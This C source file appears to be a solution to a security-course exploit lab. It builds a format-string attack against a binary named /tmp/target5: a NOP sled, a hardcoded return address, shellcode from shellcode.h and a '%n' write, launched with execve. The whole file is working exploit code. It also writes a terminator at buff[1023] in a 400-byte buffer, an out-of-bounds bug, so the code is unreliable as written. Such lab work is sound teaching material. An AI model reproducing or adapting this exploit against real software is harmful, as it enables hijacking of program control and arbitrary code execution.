#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define NOP 0x90
#define EIP 0xbffffced
int main(void)
{
  char *args[3];
  char *env[1];
  char buff[400];
  int i;
  int addr;
  char *char_ptr;
  long *addr_ptr;
  char *fmt_str;
  
    fmt_str = "%u%u%012582523u%n";
    for (i =0; i < 400;i++) {
     buff[i] = NOP;
    }  
    addr_ptr = (long *) buff;
    *(addr_ptr) = EIP;

    char_ptr = buff + (399 - strlen(fmt_str));
    for (i = 0; i < strlen(fmt_str); i++) {
     *(char_ptr++) = fmt_str[i];
    }

    char_ptr = buff + (399 - strlen(shellcode) - strlen(fmt_str));
    for (i = 0; i < strlen(shellcode); i++) {
    *(char_ptr++) = shellcode[i];
    }

    buff[1023] = '\0';

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
